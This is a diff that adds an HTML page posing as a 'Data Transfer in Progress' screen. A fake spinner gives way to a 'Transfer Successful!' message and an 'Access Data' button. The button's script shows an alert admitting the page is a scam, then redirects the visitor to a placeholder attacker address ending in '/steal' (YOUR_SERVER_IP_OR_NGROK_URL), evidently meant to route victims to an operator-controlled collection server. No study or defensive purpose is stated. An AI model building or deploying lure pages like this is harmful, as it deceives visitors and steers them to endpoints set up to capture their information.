@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Transfer in Progress</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #0a0a0a;
+            color: #00ff00;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading {
+            margin: 50px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #00ff00;
+            border-top: 5px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            font-size: 24px;
+            margin: 20px;
+        }
+        .success {
+            color: #00ff00;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-screen">
+        <h1>🔄 Transferring Your Data...</h1>
+        <div class="loading"></div>
+        <p class="message" id="loading-message">Please wait while we process your request.</p>
+    </div>
+
+    <div id="success-screen" style="display: none;">
+        <h1>✅ Transfer Successful!</h1>
+        <p class="success">Your Data Has Been Transferred!</p>
+        <p>Click below to access your data:</p>
+        <button style="background: #00ff00; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;" onclick="showAlert()">Access Data</button>
+    </div>
+
+    <script>
+        setTimeout(function() {
+            document.getElementById("loading-screen").style.display = "none";
+            document.getElementById("success-screen").style.display = "block";
+        }, 5000);
+
+        function showAlert() {
+            alert("⚠️ SECURITY ALERT! ⚠️\n\nThis is a scam! Your data is not being transferred.\n\nClick 'OK' to close this window.");
+            window.location.href = "http://YOUR_SERVER_IP_OR_NGROK_URL/steal";
+        }
+    </script>
+</body>
+</html>
